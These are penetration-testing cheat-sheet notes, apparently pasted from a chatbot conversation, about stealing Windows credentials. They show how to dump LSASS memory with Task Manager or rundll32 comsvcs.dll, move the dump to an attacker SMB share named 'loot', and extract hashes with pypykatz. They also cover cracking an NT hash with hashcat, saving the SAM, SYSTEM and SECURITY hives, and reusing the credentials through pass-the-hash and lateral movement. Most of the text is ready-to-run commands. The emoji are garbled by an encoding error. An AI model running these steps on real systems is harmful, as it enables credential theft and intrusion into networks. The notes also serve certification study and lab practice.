ğŸ§  Concept Overview â€“ Attacking LSASS
LSASS (Local Security Authority Subsystem Service) handles:

Credential caching

Creating access tokens

Writing to security logs

Attacking LSASS = pulling creds straight from memory. ğŸ”¥

Dump memory â transfer file â parse it offline â crack NT hash

ğŸ§° Methods to Dump LSASS Memory
ğŸ–±ï¸ 1. GUI (Task Manager Method)
âœ… Easy, but requires RDP or GUI shell.

Open Task Manager â†’ Processes tab

Right click lsass.exe â†’ Create Dump File

Saved as:

pgsql
Copy
Edit
C:\Users\<user>\AppData\Local\Temp\lsass.DMP
ğŸ’» 2. Command Line (rundll32 + comsvcs.dll)
âœ… Use when you only have CLI access (evil-winrm, reverse shell, etc.)

ğŸ” Get LSASS PID:
cmd
Copy
Edit
tasklist /svc
or

powershell
Copy
Edit
Get-Process lsass
ğŸ“ Create Dump File:
powershell
Copy
Edit
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
ğŸ“¦ Note: Modern AVs will block this â€” may require AV evasion.

ğŸšš Transfer to Attack Box
Use smbserver.py:

bash
Copy
Edit
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support loot /home/buck/lsass/
Then on Windows:

cmd
Copy
Edit
move C:\lsass.dmp \\<your-ip>\loot
ğŸª¬ Credential Extraction â€“ pypykatz (Linux Mimikatz)
bash
Copy
Edit
pypykatz lsa minidump /home/buck/lsass/lsass.dmp
Key sections from output:

Section	Value
MSV	Contains NTLM hash! ğŸ”¥
WDIGEST	Clear-text password (if not patched)
Kerberos	Username, domain, sometimes tickets
DPAPI	Masterkeys to decrypt Chrome, IE, RDP saved creds
ğŸ”“ Cracking the NT Hash
bash
Copy
Edit
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
Output:

bash
Copy
Edit
64f12cddaa88057e06a81b54e73b949b:Password1
Use cracked password for:

RDP

WinRM

SMB login

Pivoting (reuse across domain)

ğŸ” Summary Workflow
text
Copy
Edit
[Got Admin Access?] 
        â†“
[Dump LSASS â†’ Task Manager or Rundll32]
        â†“
[Transfer Dump to Kali â†’ smbserver]
        â†“
[Parse w/ pypykatz â†’ Extract NT hash]
        â†“
[Crack hash w/ hashcat -m 1000]
        â†“
[Use creds for access or lateral move]
ğŸ§  Key Notes:
WDIGEST only shows cleartext on old OS versions or when enabled manually.

pypykatz is lightweight, cross-platform, doesn't need to be run on victim.

LSASS dumps are golden â€” even without cracking, NT hashes = PtH potential.

ğŸ” Why You Need Admin First
LSASS is a protected process. It's got:

System-level permissions

Credential gold mine (NT hashes, plaintext, Kerberos tickets, DPAPI keys)

ğŸ‘‰ Without admin or SYSTEM, you:

âŒ Canâ€™t create memory dumps of LSASS

âŒ Canâ€™t access SAM/SECURITY/SYSTEM registry hives

âŒ Canâ€™t run mimikatz or rundll32-based dumping

âŒ Canâ€™t touch lsass.exe with PowerShell or CMD

ğŸ”“ Ways to Get Admin Access First
Local Privilege Escalation (like you're grinding in CPTS/HTB)

Service misconfigs

Unquoted paths

Weak permissions

Kernel exploits

Valid Admin Creds (cracked from SAM, RDP, SMB, Evil-WinRM)

Token Impersonation (e.g., from SeImpersonate + Potato chains)

Password Reuse / Stuffing after cracking one user

ğŸ§¨ Then You Can:
ğŸ”¸ Dump LSASS (rundll32, Task Manager)

ğŸ”¸ Dump SAM + SYSTEM (reg save)

ğŸ”¸ Use pypykatz or secretsdump.py

ğŸ”¸ Crack with hashcat

ğŸ”¸ Reuse creds or PtH to laterally move

ğŸ” SAM + SYSTEM + SECURITY Dumps:
You get this after you have admin access, usually from:

bash
Copy
Edit
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
What You Get:

ğŸ” NT hashes of local users (from SAM)

ğŸ” Cached domain creds (if domain-joined & offline logons were used) from SECURITY

Use secretsdump.py from Impacket to parse

Can be cracked offline or used in Pass-the-Hash attacks

ğŸ“Œ These are static creds stored on disk.

ğŸ§  LSASS Dump (Memory) â€” lsass.dmp
Dumped from memory, not disk. Think of this like:

ğŸ“¸ A snapshot of everything actively logged in.

What You Might Pull from LSASS:

âœ… NTLM hashes (from MSV auth provider)

âœ… Cleartext passwords (only if WDIGEST is enabled, or from credential providers)

âœ… Kerberos tickets for logged-on users

âœ… DPAPI master keys (used for decrypting secrets)

âœ… Web creds, Chrome/IE stored passwords, RDP creds, Outlook creds, VPN creds

âœ… Tokens from running services, Scheduled Tasks, SYSTEM services

ğŸ’¥ LSASS = Live session data â€” stuff you canâ€™t get from SAM.

ğŸ§ ğŸ” TL;DR â€” Which One Gets What?
Targeted Dump	Gives You...
SAM + SYSTEM	NT hashes of local accounts (offline, static)
SECURITY Hive	Cached domain creds (only if domain-joined and cached logons exist)
LSASS Memory	ğŸ”¥ Cleartext creds (sometimes), Kerberos tickets, DPAPI master keys, web/RDP/VPN creds
So yeah Buck, if you're looking for creds beyond just user logins â€” like web creds, browser saved logins, or Outlook/VPN passwords â€”
ğŸ’£ LSASS is where that juicy dynamic data lives.
